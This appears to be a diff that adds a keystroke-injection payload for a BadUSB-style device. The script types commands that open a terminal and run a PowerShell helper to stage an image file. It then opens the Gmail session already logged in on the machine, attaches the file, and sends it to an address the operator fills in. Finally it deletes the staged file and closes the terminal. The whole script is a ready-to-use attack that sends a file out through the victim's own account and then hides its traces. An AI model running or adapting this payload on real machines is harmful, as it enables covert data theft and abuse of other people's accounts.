@@ -1,0 +1,91 @@
+REM Send email
+
+REM Exit from Overview
+ESC
+DELAY 200
+REM Open terminal window
+ALT F2
+DELAY 1000
+STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfce4-terminal||tilix||konsole||xterm"
+DELAY 300
+ENTER
+REM It can take a bit to open the correct terminal
+DELAY 1500
+
+REM Make sure we are running in a POSIX-compliant shell
+STRING env sh
+ENTER
+
+REM Clear the screen in case some banner was displayed
+STRING clear
+ENTER
+
+REM Let's copy our image to the downloads folder using eml.ps1
+STRING pwsh ./Downloads/eml/eml.ps1 -start
+ENTER
+DELAY 5000
+
+REM Start Firefox browser
+STRING firefox mail.google.com
+ENTER
+DELAY 5000
+ALT TAB
+DELAY 5000
+
+REM Press 'c' to open Compose button
+STRING c
+
+DELAY 1000
+
+REM Writing out email
+STRING PUTTHEEMAILYOUWANTTOSENDTOHERE@gmail.com
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+STRING testing...
+TAB
+DELAY 500
+STRING testing.....
+DELAY 2000
+
+REM Attaching document
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+STRING testing
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 100
+ENTER
+
+REM Send email
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+
+REM Delete image from downloads and exit terminal
+DELAY 500
+ALT TAB
+STRING pwsh ./Downloads/eml/eml.ps1 -clean
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
